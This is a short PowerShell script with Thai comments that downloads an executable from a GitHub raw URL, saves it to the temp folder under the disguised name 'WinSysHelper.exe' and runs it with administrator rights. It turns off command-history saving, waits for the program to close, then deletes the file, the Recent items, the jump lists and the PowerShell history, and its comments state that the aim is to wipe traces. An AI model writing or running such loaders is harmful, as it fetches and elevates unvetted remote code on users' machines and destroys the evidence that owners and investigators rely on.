$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'
try { Set-PSReadlineOption -HistorySaveStyle SaveNothing } catch {}

# 1. เตรียมไฟล์
$url = "https://github.com/silentaimv1-png/basxpanel/raw/refs/heads/main/BASX.exe"
$output = "$env:TEMP\WinSysHelper.exe"

# 2. โหลดไฟล์
Invoke-WebRequest -Uri $url -OutFile $output

# 3. รันแบบ Admin (ถ้ารันผ่าน PowerShell จะไม่ปิดตัวเองจนกว่าจะสั่ง)
Start-Process -FilePath $output -Verb RunAs

# 4. รอให้โปรแกรมเริ่มทำงานก่อน 3 วินาที
Start-Sleep -Seconds 3

# 5. วนลูปเช็ค: ถ้ายังเห็นโปรแกรม "WinSysHelper" (หรือ BASX) ทำงานอยู่ ให้รอไปเรื่อยๆ
# บาสต้องเช็คว่าใน Task Manager โปรแกรมบาสชื่ออะไร ถ้าชื่อ BASX ให้เปลี่ยนตรงนี้เป็น "BASX"
while (Get-Process "WinSysHelper" -ErrorAction SilentlyContinue) {
    Start-Sleep -Seconds 2
}

# 6. พอปิดโปรแกรมปุ๊บ ล้างร่องรอยทันที
Remove-Item -Path $output -Force
Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Recent\WinSysHelper*" -Force
Get-ChildItem -Path "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations" | Remove-Item -Force
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force

exit
